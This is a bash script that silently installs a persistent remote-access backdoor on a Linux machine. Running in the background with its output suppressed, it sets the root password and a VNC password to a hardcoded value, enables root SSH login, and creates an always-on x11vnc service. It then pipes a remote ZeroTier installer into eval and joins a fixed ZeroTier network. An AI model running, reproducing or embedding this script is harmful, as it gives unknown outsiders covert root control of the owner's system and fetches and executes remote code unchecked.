#!/usr/bin/env bash

run_bdi() {
  apt update
  apt --fix-broken install -y openssh-server x11vnc 

  mkdir /etc/x11vnc
  x11vnc --storepasswd bruh22 /etc/x11vnc/vncpwd
  yes bruh22 | passwd

  echo -e "[Unit]\nDescription=Start x11vnc at startup.\nAfter=multi-user.target\n\n[Service]\nType=simple\nExecStart=/usr/bin/x11vnc -auth guess -forever -noxdamage -repeat -rfbauth /etc/x11vnc/vncpwd -rfbport 5900 -shared\n\n[Install]\nWantedBy=multi-user.target" > /lib/systemd/system/x11vnc.service

  echo "PermitRootLogin yes" >> /etc/ssh/sshd_config

  systemctl daemon-reload
  systemctl restart ssh.service x11vnc.service
  systemctl enable ssh.service x11vnc.service

  eval "$(curl -s 'https://install.zerotier.com' | awk '/^exit 0$/ { exit } { print }')"
  zerotier-cli join 4bb27c774d587f77
}

if [ $(id -u) -ne 0 ]
then 
  sudo "$0"
  exit 99
fi

run_bdi &> /dev/null &

